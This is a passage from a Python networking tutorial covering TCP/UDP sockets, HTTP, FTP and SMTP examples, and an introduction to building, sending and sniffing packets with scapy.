<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="ss">f"Broadcast: </span><span class="sc">{</span>network<span class="sc">.</span>broadcast_address<span class="sc">}</span><span class="ss">"</span>)</span>
<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="ss">f"Hosts: </span><span class="sc">{</span><span class="bu">list</span>(network.hosts())[:<span class="dv">5</span>]<span class="sc">}</span><span class="ss">..."</span>)  <span class="co"># Display first 5 hosts</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
</section>
<section id="routing-algorithms" class="level4" data-number="16.0.1.3">
<h4 data-number="16.0.1.3" class="anchored" data-anchor-id="routing-algorithms"><span class="header-section-number">16.0.1.3</span> Routing Algorithms</h4>
<p>Routing algorithms determine the best path for data to travel across a network. Common algorithms include Distance Vector Routing and Link State Routing.</p>
</section>
</section>
<section id="transport-layer-topics" class="level3" data-number="16.0.2">
<h3 data-number="16.0.2" class="anchored" data-anchor-id="transport-layer-topics"><span class="header-section-number">16.0.2</span> Transport Layer Topics</h3>
<section id="tcpudp-protocols" class="level4" data-number="16.0.2.1">
<h4 data-number="16.0.2.1" class="anchored" data-anchor-id="tcpudp-protocols"><span class="header-section-number">16.0.2.1</span> TCP/UDP Protocols</h4>
<p>TCP (Transmission Control Protocol) and UDP (User Datagram Protocol) are key transport layer protocols. TCP is connection-oriented and reliable, while UDP is connectionless and faster but less reliable.</p>
<section id="example-tcp-client-and-server" class="level5" data-number="16.0.2.1.1">
<h5 data-number="16.0.2.1.1" class="anchored" data-anchor-id="example-tcp-client-and-server"><span class="header-section-number">16.0.2.1.1</span> Example: TCP Client and Server</h5>
<p><strong>TCP Server:</strong></p>
<div class="sourceCode" id="cb3"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> socket</span>
<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>server_socket <span class="op">=</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span>
<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>server_socket.bind((<span class="st">'127.0.0.1'</span>, <span class="dv">65432</span>))</span>
<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>server_socket.listen()</span>
<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="st">"TCP Server listening on port 65432"</span>)</span>
<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> <span class="va">True</span>:</span>
<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a>    conn, addr <span class="op">=</span> server_socket.accept()</span>
<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a>    <span class="cf">with</span> conn:</span>
<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="ss">f"Connected by </span><span class="sc">{</span>addr<span class="sc">}</span><span class="ss">"</span>)</span>
<span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a>        data <span class="op">=</span> conn.recv(<span class="dv">1024</span>)</span>
<span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="kw">not</span> data:</span>
<span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a>            <span class="cf">break</span></span>
<span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a>        conn.sendall(data)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p><strong>TCP Client:</strong></p>
<div class="sourceCode" id="cb4"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> socket</span>
<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>client_socket <span class="op">=</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span>
<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>client_socket.<span class="ex">connect</span>((<span class="st">'127.0.0.1'</span>, <span class="dv">65432</span>))</span>
<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>client_socket.sendall(<span class="st">b'Hello, World!'</span>)</span>
<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>data <span class="op">=</span> client_socket.recv(<span class="dv">1024</span>)</span>
<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="ss">f"Received: </span><span class="sc">{</span>data<span class="sc">.</span>decode()<span class="sc">}</span><span class="ss">"</span>)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="example-udp-client-and-server" class="level5" data-number="16.0.2.1.2">
<h5 data-number="16.0.2.1.2" class="anchored" data-anchor-id="example-udp-client-and-server"><span class="header-section-number">16.0.2.1.2</span> Example: UDP Client and Server</h5>
<p><strong>UDP Server:</strong></p>
<div class="sourceCode" id="cb5"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> socket</span>
<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>server_socket <span class="op">=</span> socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span>
<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>server_socket.bind((<span class="st">'127.0.0.1'</span>, <span class="dv">65432</span>))</span>
<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="st">"UDP Server listening on port 65432"</span>)</span>
<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> <span class="va">True</span>:</span>
<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>    data, addr <span class="op">=</span> server_socket.recvfrom(<span class="dv">1024</span>)</span>
<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="ss">f"Received from </span><span class="sc">{</span>addr<span class="sc">}</span><span class="ss">: </span><span class="sc">{</span>data<span class="sc">.</span>decode()<span class="sc">}</span><span class="ss">"</span>)</span>
<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a>    server_socket.sendto(data, addr)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p><strong>UDP Client:</strong></p>
<div class="sourceCode" id="cb6"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> socket</span>
<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>client_socket <span class="op">=</span> socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span>
<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>client_socket.sendto(<span class="st">b'Hello, World!'</span>, (<span class="st">'127.0.0.1'</span>, <span class="dv">65432</span>))</span>
<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a>data, server <span class="op">=</span> client_socket.recvfrom(<span class="dv">1024</span>)</span>
<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="ss">f"Received: </span><span class="sc">{</span>data<span class="sc">.</span>decode()<span class="sc">}</span><span class="ss">"</span>)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
</section>
<section id="flow-control-and-error-control" class="level4" data-number="16.0.2.2">
<h4 data-number="16.0.2.2" class="anchored" data-anchor-id="flow-control-and-error-control"><span class="header-section-number">16.0.2.2</span> Flow Control and Error Control</h4>
<p>Flow control ensures data is sent at a rate that the receiver can handle. Error control detects and corrects errors in transmitted data. TCP implements both flow control (using windowing) and error control (using checksums and acknowledgments).</p>
</section>
</section>
<section id="application-layer-protocols" class="level3" data-number="16.0.3">
<h3 data-number="16.0.3" class="anchored" data-anchor-id="application-layer-protocols"><span class="header-section-number">16.0.3</span> Application Layer Protocols</h3>
<section id="http-hypertext-transfer-protocol" class="level4" data-number="16.0.3.1">
<h4 data-number="16.0.3.1" class="anchored" data-anchor-id="http-hypertext-transfer-protocol"><span class="header-section-number">16.0.3.1</span> HTTP (Hypertext Transfer Protocol)</h4>
<p>HTTP is the foundation of data communication on the web.</p>
<section id="example-simple-http-get-request-using-socket" class="level5" data-number="16.0.3.1.1">
<h5 data-number="16.0.3.1.1" class="anchored" data-anchor-id="example-simple-http-get-request-using-socket"><span class="header-section-number">16.0.3.1.1</span> Example: Simple HTTP GET Request using <code>socket</code></h5>
<div class="sourceCode" id="cb7"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> socket</span>
<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>request <span class="op">=</span> <span class="st">"GET / HTTP/1.1</span><span class="ch">\r\n</span><span class="st">Host: www.example.com</span><span class="ch">\r\n\r\n</span><span class="st">"</span></span>
<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>client_socket <span class="op">=</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span>
<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>client_socket.<span class="ex">connect</span>((<span class="st">'www.example.com'</span>, <span class="dv">80</span>))</span>
<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>client_socket.sendall(request.encode())</span>
<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a>response <span class="op">=</span> client_socket.recv(<span class="dv">4096</span>)</span>
<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(response.decode())</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
</section>
<section id="ftp-file-transfer-protocol" class="level4" data-number="16.0.3.2">
<h4 data-number="16.0.3.2" class="anchored" data-anchor-id="ftp-file-transfer-protocol"><span class="header-section-number">16.0.3.2</span> FTP (File Transfer Protocol)</h4>
<p>FTP is used for transferring files between a client and server.</p>
<section id="example-simple-ftp-interaction-using-ftplib" class="level5" data-number="16.0.3.2.1">
<h5 data-number="16.0.3.2.1" class="anchored" data-anchor-id="example-simple-ftp-interaction-using-ftplib"><span class="header-section-number">16.0.3.2.1</span> Example: Simple FTP Interaction using <code>ftplib</code></h5>
<div class="sourceCode" id="cb8"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> ftplib <span class="im">import</span> FTP</span>
<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a>ftp <span class="op">=</span> FTP(<span class="st">'ftp.dlptest.com'</span>)</span>
<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a>ftp.login()</span>
<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a>ftp.retrlines(<span class="st">'LIST'</span>)</span>
<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a>ftp.quit()</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
</section>
<section id="smtp-simple-mail-transfer-protocol" class="level4" data-number="16.0.3.3">
<h4 data-number="16.0.3.3" class="anchored" data-anchor-id="smtp-simple-mail-transfer-protocol"><span class="header-section-number">16.0.3.3</span> SMTP (Simple Mail Transfer Protocol)</h4>
<p>SMTP is used for sending emails.</p>
<section id="example-sending-email-using-smtplib" class="level5" data-number="16.0.3.3.1">
<h5 data-number="16.0.3.3.1" class="anchored" data-anchor-id="example-sending-email-using-smtplib"><span class="header-section-number">16.0.3.3.1</span> Example: Sending Email using <code>smtplib</code></h5>
<div class="sourceCode" id="cb9"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> smtplib</span>
<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> email.mime.text <span class="im">import</span> MIMEText</span>
<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a>msg <span class="op">=</span> MIMEText(<span class="st">"This is the body of the email."</span>)</span>
<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a>msg[<span class="st">'Subject'</span>] <span class="op">=</span> <span class="st">"Test Email"</span></span>
<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a>msg[<span class="st">'From'</span>] <span class="op">=</span> <span class="st">"your_email@example.com"</span></span>
<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a>msg[<span class="st">'To'</span>] <span class="op">=</span> <span class="st">"recipient_email@example.com"</span></span>
<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a><span class="cf">with</span> smtplib.SMTP(<span class="st">'smtp.example.com'</span>) <span class="im">as</span> server:</span>
<span id="cb9-10"><a href="#cb9-10" aria-hidden="true" tabindex="-1"></a>    server.login(<span class="st">"your_email@example.com"</span>, <span class="st">"your_password"</span>)</span>
<span id="cb9-11"><a href="#cb9-11" aria-hidden="true" tabindex="-1"></a>    server.sendmail(msg[<span class="st">'From'</span>], [msg[<span class="st">'To'</span>]], msg.as_string())</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
</section>
</section>
<section id="network-packet-analysis-with-scapy" class="level3" data-number="16.0.4">
<h3 data-number="16.0.4" class="anchored" data-anchor-id="network-packet-analysis-with-scapy"><span class="header-section-number">16.0.4</span> Network Packet Analysis with <code>scapy</code></h3>
<p><code>scapy</code> is a powerful Python library for network packet manipulation and analysis.</p>
<section id="installing-scapy" class="level4" data-number="16.0.4.1">
<h4 data-number="16.0.4.1" class="anchored" data-anchor-id="installing-scapy"><span class="header-section-number">16.0.4.1</span> Installing <code>scapy</code></h4>
<div class="sourceCode" id="cb10"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="ex">pip</span> install scapy</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="example-capturing-and-analyzing-packets" class="level4" data-number="16.0.4.2">
<h4 data-number="16.0.4.2" class="anchored" data-anchor-id="example-capturing-and-analyzing-packets"><span class="header-section-number">16.0.4.2</span> Example: Capturing and Analyzing Packets</h4>
<div class="sourceCode" id="cb11"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> scapy.<span class="bu">all</span> <span class="im">import</span> sniff</span>
<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> packet_callback(packet):</span>
<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(packet.show())</span>
<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a><span class="co"># Capture 10 packets</span></span>
<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a>sniff(prn<span class="op">=</span>packet_callback, count<span class="op">=</span><span class="dv">10</span>)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
</section>
<section id="conclusion" class="level3" data-number="16.0.5">
<h3 data-number="16.0.5" class="anchored" data-anchor-id="conclusion"><span class="header-section-number">16.0.5</span> Conclusion</h3>
<p>Understanding network architecture and protocols is essential for designing and managing efficient networks. Python provides powerful libraries like <code>scapy</code> and <code>socket</code> to interact with and analyze network traffic. By mastering these tools and concepts, you can develop robust networked applications and effectively troubleshoot network issues.</p>
</section>
<section id="deep-dive-into-the-scapy-python-module-for-network-packet-analysis" class="level1" data-number="17">
<h1 data-number="17"><span class="header-section-number">17</span> Deep Dive into the <code>scapy</code> Python Module for Network Packet Analysis</h1>
<p><code>scapy</code> is a powerful Python module used for network packet manipulation, analysis, and crafting. It is widely used in network security and research to create, manipulate, send, and capture network packets. This tutorial provides a comprehensive guide to using <code>scapy</code> for network packet analysis.</p>
<section id="table-of-contents" class="level2" data-number="17.1">
<h2 data-number="17.1" class="anchored" data-anchor-id="table-of-contents"><span class="header-section-number">17.1</span> Table of Contents</h2>
<ol type="1">
<li><a href="#introduction-to-scapy">Introduction to <code>scapy</code></a></li>
<li><a href="#installing-scapy">Installing <code>scapy</code></a></li>
<li><a href="#basic-concepts">Basic Concepts</a></li>
<li><a href="#creating-and-sending-packets">Creating and Sending Packets</a></li>
<li><a href="#capturing-packets">Capturing Packets</a></li>
<li><a href="#analyzing-packets">Analyzing Packets</a></li>
<li><a href="#advanced-usage">Advanced Usage</a></li>
<li><a href="#practical-examples">Practical Examples</a></li>
<li><a href="#best-practices">Best Practices</a></li>
<li><a href="#conclusion">Conclusion</a></li>
</ol>
</section>
<section id="introduction-to-scapy" class="level2" data-number="17.2">
<h2 data-number="17.2" class="anchored" data-anchor-id="introduction-to-scapy"><span class="header-section-number">17.2</span> Introduction to <code>scapy</code></h2>
<p><code>scapy</code> is a Python-based interactive network packet manipulation tool. It allows you to create, send, receive, and manipulate network packets. It supports many network protocols and can be used for tasks such as network discovery, scanning, tracerouting, probing, and penetration testing.</p>
</section>
<section id="installing-scapy-1" class="level2" data-number="17.3">
<h2 data-number="17.3" class="anchored" data-anchor-id="installing-scapy-1"><span class="header-section-number">17.3</span> Installing <code>scapy</code></h2>
<p>To install <code>scapy</code>, you can use pip:</p>
<div class="sourceCode" id="cb12"><pre class="sourceCode sh code-with-copy"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="ex">pip</span> install scapy</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>You may also need to install additional system dependencies, such as <code>libpcap</code> and <code>tcpdump</code>, depending on your operating system.</p>
</section>
<section id="basic-concepts" class="level2" data-number="17.4">
<h2 data-number="17.4" class="anchored" data-anchor-id="basic-concepts"><span class="header-section-number">17.4</span> Basic Concepts</h2>
<section id="importing-scapy" class="level3" data-number="17.4.1">
<h3 data-number="17.4.1" class="anchored" data-anchor-id="importing-scapy"><span class="header-section-number">17.4.1</span> Importing <code>scapy</code></h3>
<p>To use <code>scapy</code>, you need to import it:</p>
<div class="sourceCode" id="cb13"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> scapy.<span class="bu">all</span> <span class="im">import</span> <span class="op">*</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="layers-and-packets" class="level3" data-number="17.4.2">
<h3 data-number="17.4.2" class="anchored" data-anchor-id="layers-and-packets"><span class="header-section-number">17.4.2</span> Layers and Packets</h3>
<p><code>scapy</code> uses a layered approach to construct and dissect packets. Each layer represents a network protocol (e.g., Ethernet, IP, TCP). Packets are created by stacking these layers.</p>
</section>
<section id="example" class="level3" data-number="17.4.3">
<h3 data-number="17.4.3" class="anchored" data-anchor-id="example"><span class="header-section-number">17.4.3</span> Example</h3>
<div class="sourceCode" id="cb14"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a>ether <span class="op">=</span> Ether()</span>
<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a>ip <span class="op">=</span> IP()</span>
<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a>tcp <span class="op">=</span> TCP()</span>
<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a>packet <span class="op">=</span> ether <span class="op">/</span> ip <span class="op">/</span> tcp</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
</section>
<section id="creating-and-sending-packets" class="level2" data-number="17.5">
<h2 data-number="17.5" class="anchored" data-anchor-id="creating-and-sending-packets"><span class="header-section-number">17.5</span> Creating and Sending Packets</h2>
<section id="creating-packets" class="level3" data-number="17.5.1">
<h3 data-number="17.5.1" class="anchored" data-anchor-id="creating-packets"><span class="header-section-number">17.5.1</span> Creating Packets</h3>
<p>Packets can be created by instantiating layer objects and stacking them together.</p>
</section>
<section id="example-1" class="level3" data-number="17.5.2">
<h3 data-number="17.5.2" class="anchored" data-anchor-id="example-1"><span class="header-section-number">17.5.2</span> Example</h3>
<div class="sourceCode" id="cb15"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a>packet <span class="op">=</span> Ether() <span class="op">/</span> IP(dst<span class="op">=</span><span class="st">"192.168.1.1"</span>) <span class="op">/</span> TCP(dport<span class="op">=</span><span class="dv">80</span>)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="sending-packets" class="level3" data-number="17.5.3">
<h3 data-number="17.5.3" class="anchored" data-anchor-id="sending-packets"><span class="header-section-number">17.5.3</span> Sending Packets</h3>
<p>To send packets, use the <code>send()</code> function for layer 3 packets (IP) and <code>sendp()</code> for layer 2 packets (Ethernet).</p>
</section>
<section id="example-2" class="level3" data-number="17.5.4">
<h3 data-number="17.5.4" class="anchored" data-anchor-id="example-2"><span class="header-section-number">17.5.4</span> Example</h3>
<div class="sourceCode" id="cb16"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a>send(packet)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="sending-multiple-packets" class="level3" data-number="17.5.5">
<h3 data-number="17.5.5" class="anchored" data-anchor-id="sending-multiple-packets"><span class="header-section-number">17.5.5</span> Sending Multiple Packets</h3>
<p>You can send multiple packets in a loop or use the <code>sendp()</code> function with a list of packets.</p>
</section>
<section id="example-3" class="level3" data-number="17.5.6">
<h3 data-number="17.5.6" class="anchored" data-anchor-id="example-3"><span class="header-section-number">17.5.6</span> Example</h3>
<div class="sourceCode" id="cb17"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a>packets <span class="op">=</span> [Ether() <span class="op">/</span> IP(dst<span class="op">=</span><span class="st">"192.168.1.1"</span>) <span class="op">/</span> TCP(dport<span class="op">=</span><span class="dv">80</span>) <span class="cf">for</span> _ <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">10</span>)]</span>
<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a>sendp(packets)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
</section>
<section id="capturing-packets" class="level2" data-number="17.6">
<h2 data-number="17.6" class="anchored" data-anchor-id="capturing-packets"><span class="header-section-number">17.6</span> Capturing Packets</h2>
<section id="sniffing-packets" class="level3" data-number="17.6.1">
<h3 data-number="17.6.1" class="anchored" data-anchor-id="sniffing-packets"><span class="header-section-number">17.6.1</span> Sniffing Packets</h3>
<p><code>scapy</code> provides the <code>sniff()</code> function to capture packets from the network.</p>
</section>
<section id="example-4" class="level3" data-number="17.6.2">
<h3 data-number="17.6.2" class="anchored" data-anchor-id="example-4"><span class="header-section-number">17.6.2</span> Example</h3>
<div class="sourceCode" id="cb18"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> packet_callback(packet):</span>
<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(packet.summary())</span>
<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a>sniff(prn<span class="op">=</span>packet_callback, count<span class="op">=</span><span class="dv">10</span>)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="filtering-packets" class="level3" data-number="17.6.3">
<h3 data-number="17.6.3" class="anchored" data-anchor-id="filtering-packets"><span class="header-section-number">17.6.3</span> Filtering Packets</h3>
<p>You can filter packets using BPF (Berkeley Packet Filter) syntax.</p>
</section>
<section id="example-5" class="level3" data-number="17.6.4">
<h3 data-number="17.6.4" class="anchored" data-anchor-id="example-5"><span class="header-section-number">17.6.4</span> Example</h3>
<div class="sourceCode" id="cb19"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a>sniff(<span class="bu">filter</span><span class="op">=</span><span class="st">"tcp and port 80"</span>, prn<span class="op">=</span>packet_callback, count<span class="op">=</span><span class="dv">10</span>)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
</section>
<section id="analyzing-packets" class="level2" data-number="17.7">
<h2 data-number="17.7" class="anchored" data-anchor-id="analyzing-packets"><span class="header-section-number">17.7</span> Analyzing Packets</h2>
<section id="dissecting-packets" class="level3" data-number="17.7.1">
<h3 data-number="17.7.1" class="anchored" data-anchor-id="dissecting-packets"><span class="header-section-number">17.7.1</span> Dissecting Packets</h3>
<p>Once you have captured packets, you can dissect and analyze them using various <code>scapy</code> functions.</p>
</section>
<section id="example-6" class="level3" data-number="17.7.2">
<h3 data-number="17.7.2" class="anchored" data-anchor-id="example-6"><span class="header-section-number">17.7.2</span> Example</h3>
<div class="sourceCode" id="cb20"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a>packet <span class="op">=</span> sniff(count<span class="op">=</span><span class="dv">1</span>)[<span class="dv">0</span>]</span>
<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(packet.show())</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="accessing-packet-fields" class="level3" data-number="17.7.3">
<h3 data-number="17.7.3" class="anchored" data-anchor-id="accessing-packet-fields"><span class="header-section-number">17.7.3</span> Accessing Packet Fields</h3>
<p>You can access specific fields within a packet by treating it like a dictionary.</p>
</section>
<section id="example-7" class="level3" data-number="17.7.4">
<h3 data-number="17.7.4" class="anchored" data-anchor-id="example-7"><span class="header-section-number">17.7.4</span> Example</h3>
<div class="sourceCode" id="cb21"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a>packet <span class="op">=</span> sniff(count<span class="op">=</span><span class="dv">1</span>)[<span class="dv">0</span>]</span>
<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(packet[IP].src)</span>
<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(packet[IP].dst)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="working-with-layers" class="level3" data-number="17.7.5">
<h3 data-number="17.7.5" class="anchored" data-anchor-id="working-with-layers"><span class="header-section-number">17.7.5</span> Working with Layers</h3>
<p>You can access different layers of a packet using indexing.</p>
</section>
<section id="example-8" class="level3" data-number="17.7.6">
<h3 data-number="17.7.6" class="anchored" data-anchor-id="example-8"><span class="header-section-number">17.7.6</span> Example</h3>
